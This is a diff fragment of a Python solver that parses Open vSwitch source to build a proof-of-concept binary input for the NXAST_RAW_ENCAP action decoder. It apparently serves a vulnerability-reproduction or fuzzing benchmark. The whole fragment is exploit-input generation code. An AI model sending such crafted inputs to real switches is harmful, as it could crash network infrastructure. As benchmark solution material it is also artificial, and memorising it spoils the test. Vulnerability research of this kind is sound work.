+                self.size_cache[name] = 0
+                return None
+            sz += ts * count
+        self.size_cache[name] = sz
+        return sz
+
+    def pack_struct(self, name: str, ctx: Dict[str, int]) -> Optional[bytes]:
+        fields = self._parse_fields(name)
+        if not fields:
+            return None
+        out = bytearray()
+        for ctype, fname, count in fields:
+            if count == 0:
+                continue
+            if ctype.strip().startswith("struct "):
+                sn = ctype.strip().split(" ", 1)[1].strip()
+                for _ in range(count):
+                    b = self.pack_struct(sn, ctx)
+                    if b is None:
+                        return None
+                    out += b
+                continue
+            ts = self.sizeof_type(ctype)
+            if ts is None:
+                return None
+            if count > 1:
+                out += b"\x00" * (ts * count)
+                continue
+            val = 0
+            fl = fname.lower()
+            if fl == "type":
+                val = ctx.get("action_type", 0xFFFF)
+            elif fl == "len":
+                val = ctx.get("action_len", 0)
+            elif fl in ("vendor", "experimenter", "vendor_id", "vendorid"):
+                val = ctx.get("vendor_id", 0x00002320)
+            elif fl == "subtype":
+                val = ctx.get("subtype", 0)
+            elif "n_props" in fl or "nproperties" in fl or "n_ed_props" in fl:
+                val = ctx.get("n_props", 1)
+            elif "props_len" in fl or "properties_len" in fl or fl == "propslen":
+                val = ctx.get("props_len", 0)
+            elif "packet_type" in fl or fl == "packettype":
+                val = ctx.get("packet_type", 0)
             else:
-                sz += fsz
-        if sz:
-            return sz
-    return 24
-
-
-def _build_nx_raw_encap_action(
-    experimenter_id: int,
-    subtype: int,
-    prop_type: int,
-    prop_len: int,
-    base_len: int,
-    total_len_target: int = 72,
-) -> bytes:
-    base_len = max(16, base_len)
-    base_len = _round_up(base_len, 8)
-
-    prop_len = max(8, prop_len)
-    prop_len = _round_up(prop_len, 8)
-
-    if total_len_target < base_len + prop_len:
-        total_len = base_len + prop_len
-        total_len = _round_up(total_len, 8)
-    else:
-        if (total_len_target - base_len) % prop_len == 0:
-            total_len = total_len_target
-        else:
-            total_len = base_len + ((total_len_target - base_len + prop_len - 1) // prop_len) * prop_len
-            total_len = _round_up(total_len, 8)
-
-    nprops = max(1, (total_len - base_len) // prop_len)
-    total_len = base_len + nprops * prop_len
-    total_len = _round_up(total_len, 8)
-
-    b = bytearray()
-    b += struct.pack("!HHI", 0xFFFF, total_len & 0xFFFF, experimenter_id & 0xFFFFFFFF)
-    b += struct.pack("!H", subtype & 0xFFFF)
-    b += b"\x00" * 6
-
-    fixed_extra = base_len - 16
-    if fixed_extra > 0:
-        b += b"\x00" * fixed_extra
-
-    for i in range(nprops):
-        b += struct.pack("!HH", prop_type & 0xFFFF, prop_len & 0xFFFF)
-        if prop_len > 4:
-            v = (i + 1) & 0xFFFFFFFF
-            payload = struct.pack("!I", v) + b"\x00" * (prop_len - 8) if prop_len >= 8 else b"\x00" * (prop_len - 4)
-            b += payload[: prop_len - 4]
-    if len(b) < total_len:
-        b += b"\x00" * (total_len - len(b))
-    return bytes(b[:total_len])
+                val = 0
+            if ts == 1:
+                out += struct.pack("!B", val & 0xFF)
+            elif ts == 2:
+                out += struct.pack("!H", val & 0xFFFF)
+            elif ts == 4:
+                out += struct.pack("!I", val & 0xFFFFFFFF)
+            elif ts == 8:
+                out += struct.pack("!Q", val & 0xFFFFFFFFFFFFFFFF)
+            else:
+                out += b"\x00" * ts
+        return bytes(out)
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        texts = _read_source_texts(src_path)
+        texts = _collect_relevant_texts(src_path)
+        if not texts:
+            return b""
 
-        exp_id = (
-            _resolve_identifier("NX_EXPERIMENTER_ID", texts)
-            or _resolve_identifier("NX_VENDOR_ID", texts)
-            or 0x00002320
-        )
-        subtype = _resolve_identifier("NXAST_RAW_ENCAP", texts)
+        ofp_actions_name = _find_ofp_actions_c(texts)
+        ofp_actions_text = texts.get(ofp_actions_name, "") if ofp_actions_name else ""
+
+        decode_raw_encap_struct = None
+        if ofp_actions_text:
+            m = re.search(r"\bdecode_NXAST_RAW_ENCAP\s*\(\s*const\s+struct\s+([A-Za-z_]\w*)\s*\*", ofp_actions_text)
+            if m:
+                decode_raw_encap_struct = m.group(1)
+
+        decode_ed_prop = None
+        if ofp_actions_text:
+            decode_ed_prop = _extract_function(ofp_actions_text, "decode_ed_prop")
+
+        prop_token = _choose_prop_token(decode_ed_prop)
+        consts = _build_constants(texts)
+
+        vendor_id = None
+        for k in ("NX_VENDOR_ID", "NX_EXPERIMENTER_ID", "NX_VENDOR", "NICIRA_VENDOR_ID"):
+            if k in consts:
+                vendor_id = consts[k]
+                break
+        if vendor_id is None:
+            vendor_id = 0x00002320
+
+        subtype = None
+        if "NXAST_RAW_ENCAP" in consts:
+            subtype = consts["NXAST_RAW_ENCAP"]
+        else:
+            expr = _find_token_expr(texts, "NXAST_RAW_ENCAP")
+            if expr:
+                v = _safe_eval_int(expr, consts)
+                if v is not None:
+                    subtype = int(v)
         if subtype is None:
             subtype = 0
 
-        ofp_actions_entry = _find_text_by_pred(texts, lambda k, v: k.endswith("ofp-actions.c") or "decode_NXAST_RAW_ENCAP" in v)
-        if ofp_actions_entry is None:
-            ofp_actions_entry = _find_text_by_pred(texts, lambda k, v: "decode_NXAST_RAW_ENCAP" in v)
-        ofp_actions_text = ofp_actions_entry[1] if ofp_actions_entry else ""
+        action_type = consts.get("OFPAT_EXPERIMENTER", consts.get("OFPAT_VENDOR", 0xFFFF)) & 0xFFFF
 
-        prop_type, prop_len = _choose_ed_prop_from_decode(ofp_actions_text, texts)
-        base_len = _resolve_raw_encap_base(texts)
+        prop_type = None
+        if prop_token and prop_token in consts:
+            prop_type = consts[prop_token] & 0xFFFF
+        elif prop_token:
+            expr = _find_token_expr(texts, prop_token)
+            if expr:
+                v = _safe_eval_int(expr, consts)
+                if v is not None:
+                    prop_type = int(v) & 0xFFFF
+        if prop_type is None:
+            for cand in ("OFPEDPT_RAW", "NX_ED_PROP_RAW", "NX_EDPT_RAW", "OFPEDPT_DATA", "OFPEDPT_PACKET", "OFPEDPT_HEADER"):
+                if cand in consts:
+                    prop_type = consts[cand] & 0xFFFF
+                    break
+        if prop_type is None:
+            prop_type = 1
 
-        action = _build_nx_raw_encap_action(
-            experimenter_id=int(exp_id),
-            subtype=int(subtype),
-            prop_type=int(prop_type),
-            prop_len=int(prop_len),
-            base_len=int(base_len),
-            total_len_target=72,
-        )
+        # Determine action fixed size and packing strategy
+        db = _CStructDB(texts)
+        fixed_size = None
+        use_struct_pack = False
+        if decode_raw_encap_struct:
+            sz = db.sizeof_struct(decode_raw_encap_struct)
+            if sz is not None and sz > 0:
+                fixed_size = sz
+                use_struct_pack = True
 
-        mode = _infer_fuzzer_mode(texts)
-        if mode == "version_prefixed":
-            return bytes([4]) + action
-        return action
+        if fixed_size is None:
+            fixed_size = 16
+            use_struct_pack = False
+
+        # Choose total length (multiple of 8) close to 72
+        if fixed_size <= 64:
+            total_len = 72
+        else:
+            total_len = ((fixed_size + 8 + 7) // 8) * 8
+        if total_len < fixed_size + 8:
+            total_len = ((fixed_size + 8 + 7) // 8) * 8
+        prop_len = total_len - fixed_size
+        prop_len = (prop_len // 8) * 8
+        if prop_len < 8:
+            total_len = ((fixed_size + 8 + 7) // 8) * 8
+            prop_len = total_len - fixed_size
+        if prop_len < 8:
+            prop_len = 8
+            total_len = fixed_size + prop_len
+            total_len = ((total_len + 7) // 8) * 8
+            prop_len = total_len - fixed_size
+
+        n_props = 1
+        packet_type = consts.get("PT_ETH", 0x00000800) & 0xFFFFFFFF
+
+        ctx = {
+            "action_type": action_type,
+            "action_len": total_len & 0xFFFF,
+            "vendor_id": vendor_id & 0xFFFFFFFF,
+            "subtype": subtype & 0xFFFF,
+            "n_props": n_props & 0xFFFF,
+            "props_len": prop_len & 0xFFFF,
+            "packet_type": packet_type,
+        }
+
+        fixed = None
+        if use_struct_pack and decode_raw_encap_struct:
+            fixed = db.pack_struct(decode_raw_encap_struct, ctx)
+
+        if not fixed or len(fixed) != fixed_size:
+            # Fallback packed guess: type,len,vendor,subtype,n_props,packet_type
+            # Total fixed size 16 bytes.
+            fixed = bytearray()
+            fixed += struct.pack("!H", action_type)
+            fixed += struct.pack("!H", total_len & 0xFFFF)
+            fixed += struct.pack("!I", vendor_id & 0xFFFFFFFF)
+            fixed += struct.pack("!H", subtype & 0xFFFF)
+            # if our guessed fixed_size differs, pad/trim accordingly
+            if fixed_size >= 16:
+                fixed += struct.pack("!H", n_props & 0xFFFF)
+                fixed += struct.pack("!I", packet_type & 0xFFFFFFFF)
+                if len(fixed) < fixed_size:
+                    fixed += b"\x00" * (fixed_size - len(fixed))
+                fixed = fixed[:fixed_size]
+            else:
+                fixed = fixed[:fixed_size]
+
+        payload_len = prop_len - 4
+        if payload_len < 0:
+            payload_len = 0
+        payload = bytes((i * 13 + 7) & 0xFF for i in range(payload_len))
+        prop = struct.pack("!HH", prop_type & 0xFFFF, prop_len & 0xFFFF) + payload
+
+        poc = bytes(fixed) + prop
+        if len(poc) != total_len:
+            if len(poc) < total_len:
+                poc += b"\x00" * (total_len - len(poc))
+            else:
+                poc = poc[:total_len]
+        return poc
